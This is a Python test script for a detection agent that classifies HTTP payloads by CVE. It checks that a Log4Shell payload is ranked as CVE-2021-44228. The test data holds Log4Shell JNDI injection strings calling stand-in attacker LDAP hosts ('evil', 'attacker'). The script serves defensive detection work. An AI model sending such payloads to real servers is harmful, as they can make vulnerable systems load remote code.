from __future__ import annotations

import sys
from pathlib import Path

PROJECT_ROOT = Path(__file__).resolve().parents[1]
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.agent.agent import TraceAgent


def main() -> None:
    analysis = TraceAgent().analyze(
        payloads=["GET /?x=${jndi:ldap://evil/a} HTTP/1.1"],
        candidates=[
            {
                "event_id": "pkt-1",
                "rank": 1,
                "cve": "CVE-2021-44228",
                "final_score": 0.92,
                "retrieval_score": 0.17,
                "rule_bonus": 0.75,
                "rule_confirmed": True,
                "signals": ["log4shell_jndi"],
                "neighbor_id": "datacon-row-1",
                "neighbor_payload": "GET /?x=${jndi:ldap://attacker/a} HTTP/1.1",
                "neighbor_labels": ["CVE-2021-44228"],
                "label_votes": {"CVE-2021-44228": 3},
                "evidence": "GET /?x=${jndi:ldap://attacker/a} HTTP/1.1",
            }
        ],
    )
    top = analysis["top_cves"][0]
    assert top["cve"] == "CVE-2021-44228"
    assert top["event_ids"] == ["pkt-1"]
    assert top["label_votes"]["CVE-2021-44228"] == 3
    assert top["evidence_details"][0]["neighbor_id"] == "datacon-row-1"
    assert "jndi" in top["evidence_details"][0]["neighbor_payload"]


if __name__ == "__main__":
    main()
